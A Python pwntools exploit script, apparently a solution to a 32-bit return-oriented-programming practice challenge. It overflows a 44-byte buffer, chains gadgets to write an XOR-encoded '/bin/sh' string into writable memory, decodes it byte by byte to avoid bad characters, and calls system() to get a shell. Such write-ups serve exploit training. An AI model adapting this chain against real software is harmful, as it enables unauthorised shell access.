from pwn import *

### My basic idea for the exploit is XOR the string ( /bin/sh) with something that doesn't have any
### bad chars within the results as we know when we XOR the resultant string with the same XOR value
### the result would be the initial string which is our /bin/sh string.

### Things to achieve
### 1) Write the string to some empty area in the binary
### 2) XOR the string
### 3) Call system with our string

payload = "A" * 44 ### Buffer
system = p32(0x80484e0) ## address of system

xor_ebx_cl = p32(0x08048890) ## xor    BYTE PTR [ebx],cl

mov_edi_esi = p32(0x08048893) ## DWORD PTR [edi],esi

space = 0x804a083 ##empty space
space1 = 0x804a087 ### empty space

pop_esi_edi = p32(0x08048899) ## pop esi; pop edi; ret; ---  popping values from stack to registers

pop_ex = p32(0x08048896) # pop ebx; pop ecx; ret

## EDI --> Address of empty space
## ESI --> String Itself

def write(string,offset):
    out = ""
    out += pop_esi_edi
    out += string
    out += offset
    out += mov_edi_esi
    return out

def xor_string(string):
    inputbytes = bytearray(string)
    bad_chars = [0x62,0x69,0X63,0x2f,0x20,0x66,0x6e,0x73]
    out = ""
    for i in range(len(inputbytes)):
        out += chr(inputbytes[i] ^ 0x2)
    return out

payload += write(xor_string(" /bi"),p32(space))

payload += write(xor_string("n/sh"),p32(space1))

for i in range(0,8):
    payload += pop_ex
    payload += p32(space+i)
    payload += p32(0x2)
    payload += xor_ebx_cl

payload += system

payload += "A" * 4

payload += p32(space)

print payload
